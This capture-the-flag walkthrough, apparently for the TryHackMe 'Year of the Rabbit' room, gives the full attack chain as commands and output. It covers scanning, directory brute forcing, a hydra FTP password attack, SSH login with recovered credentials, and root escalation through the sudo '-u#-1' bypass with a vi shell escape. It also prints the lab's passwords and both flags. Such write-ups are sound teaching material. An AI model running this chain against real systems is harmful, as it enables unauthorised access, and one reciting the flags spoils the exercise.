---
custom_edit_url: null
---

## Task 1: Flags
### What is the user flag?
Let's scan the target machine using `nmap`.
```
$ nmap -sC -sV 10.10.181.61
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-06 22:24 IST
Nmap scan report for 10.10.181.61
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.36 seconds
```
There are three open ports:

| Port | Service | 
| :-: | :-: |
| 21 | ftp |
| 22 | ssh |
| 80 | http |
 
We can brute force the directories of the webpage using `gobuster`.
```
$ gobuster dir -u http://10.10.181.61 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.181.61
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.181.61/assets/]
/index.html           (Status: 200) [Size: 7853]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
=============================================================== 
```
Let's go to the `assets/` directory.

![2](https://github.com/Knign/Write-ups/assets/110326359/bfe4b1ed-4bcd-402a-a4ba-c9edbf41db94)

Let's check out the `style.css` file. We will avoid the `RickRolled.mp4` file for obvious reasons.

![3](https://github.com/Knign/Write-ups/assets/110326359/f5fd2f1a-5528-4986-8cdc-eec53f9e1fc6)

So now we can go to `/sup3r_s3cr3t_fl4g.php`.

![4](https://github.com/Knign/Write-ups/assets/110326359/2a2f6f59-4904-49da-a78f-a3722d93e26d)

If we click `OK` we just get Rick Rolled.

Let's intercept the request in Burpsuite.

![5](https://github.com/Knign/Write-ups/assets/110326359/006debc1-d1e5-4a96-929f-d214e784ad25)

We can `Forward` this request.

![6](https://github.com/Knign/Write-ups/assets/110326359/978c8913-9e61-4bed-9bc3-0fda7d941472)

Let's see what is in the `/WExYY2Cv-qU` directory.

![7](https://github.com/Knign/Write-ups/assets/110326359/23d1e734-2667-48db-ae07-d073b8d6756e)

We can download the `Hot_Babe.png` file using `wget`.
```
$ wget http://10.10.181.61/WExYY2Cv-qU/Hot_Babe.png
--2023-12-06 23:00:36--  http://10.10.181.61/WExYY2Cv-qU/Hot_Babe.png
Connecting to 10.10.181.61:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 475075 (464K) [image/png]
Saving to: ‘Hot_Babe.png’

Hot_Babe.png                                               100%[========================================================================================================================================>] 463.94K  92.9KB/s    in 5.0s    

2023-12-06 23:00:42 (92.9 KB/s) - ‘Hot_Babe.png’ saved [475075/475075]
```
Let's use the `strings` utility to see the strings present inside the file.
```
$ strings Hot_Babe.png
-- snip --;
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```
Let's save the password to a file called `ftp_passwords.txt`.
Now using `hydra` we can brute force the FTP login.
```
$ hydra -l ftpuser -P /home/kunal/tryhackme/yearoftherabbit/ftp_passwords.txt ftp://10.10.181.61 -t 4
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-06 23:12:11
[DATA] max 4 tasks per 1 server, overall 4 tasks, 82 login tries (l:1/p:82), ~21 tries per task
[DATA] attacking ftp://10.10.181.61:21/
[21][ftp] host: 10.10.181.61   login: ftpuser   password: 5iez1wGXKfPKQ
[STATUS] 82.00 tries/min, 82 tries in 00:01h, 1 to do in 00:01h, 3 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-06 23:13:12
```
So the password for `ftpuser` is `5iez1wGXKfPKQ`.

Let's login using those credentials.
```
$ ftp ftpuser@10.10.181.61
Connected to 10.10.181.61.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
Let's look around for important files.
```
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
```
We can download the `Eli's_Creds.txt` file to our machine using the `get` command.
```
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
100% |***********************************************************************************************************************************************************************************************|   758        0.74 KiB/s    --:-- ETA
226 Transfer complete.
758 bytes received in 00:00 (2.40 KiB/s)
```
Let's read the contents of the file.
```
$ cat Eli\'s_Creds.txt        
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```
The text is in Brain Fuck. 
We can use an online decoder to decode it.

![8](https://github.com/Knign/Write-ups/assets/110326359/020c0449-508b-4233-8a30-051dac7c6c37)

| Username | Password |
| :-: | :-: |
| eli | DSpDiM1wAEwid |

We can try to login through SSH using these credentials.
```
$ ssh eli@10.10.181.61
The authenticity of host '10.10.181.61 (10.10.181.61)' can't be established.
ED25519 key fingerprint is SHA256:va5tHoOroEmHPZGWQySirwjIb9lGquhnIA1Q0AY/Wrw.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.181.61' (ED25519) to the list of known hosts.
eli@10.10.181.61's password: 


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE




eli@year-of-the-rabbit:~$ 
```
After a bit of searching we can find the `user.txt` file.
```
eli@year-of-the-rabbit:~$ cd ../gwendoline/
eli@year-of-the-rabbit:/home/gwendoline$ ls
user.txt
```
Let's try to read it.
```
eli@year-of-the-rabbit:/home/gwendoline$ cat user.txt 
cat: user.txt: Permission denied
```
The user `eli` does not have the permission to read the `user.txt` file.

Let's try to find the `s3cr3t` mentioned in the message.
```
eli@year-of-the-rabbit:~$ locate s3cr3t
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
/var/www/html/sup3r_s3cr3t_fl4g.php
```
We can now read the `.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!` file.
```
eli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```
So now we know that the password for `gwendoline` user is `MniVCQVhQHUNI`.

Let's switch users.
```
eli@year-of-the-rabbit:~$ su gwendoline
Password: 
gwendoline@year-of-the-rabbit:/home/eli$ 
```
We can now read the `user.txt` file we saw earlier.
```
gwendoline@year-of-the-rabbit:/home/eli$ cd /home/gwendoline/
gwendoline@year-of-the-rabbit:~$ cat user.txt 
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```
### Answer
```
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

&nbsp;

### What is the root flag?
We can check what permissions `gwendoline` has using the `sudo` command.
```
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```
Let's check the version of `sudo`.
```
gwendoline@year-of-the-rabbit:~$ sudo -V
Sudo version 1.8.10p3
Sudoers policy plugin version 1.8.10p3
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.10p3
```
We can find an exploit for that version om Exploit-DB.

![9](https://github.com/Knign/Write-ups/assets/110326359/2f1e4e69-d600-4857-b53f-f70827737ac5)

Let's craft our exploit.
```
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```
Next we have to type the following;

```
:!/bin/bash
```

![10](https://github.com/Knign/Write-ups/assets/110326359/55986df9-d404-4786-b90a-d5082bc853b5)

We must have `root` access.
```
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

root@year-of-the-rabbit:/home/gwendoline#
```
Let's get the root flag.
```
root@year-of-the-rabbit:/home/gwendoline# cd /root/
root@year-of-the-rabbit:/root# cat root.txt 
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```
### Answer
```
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```
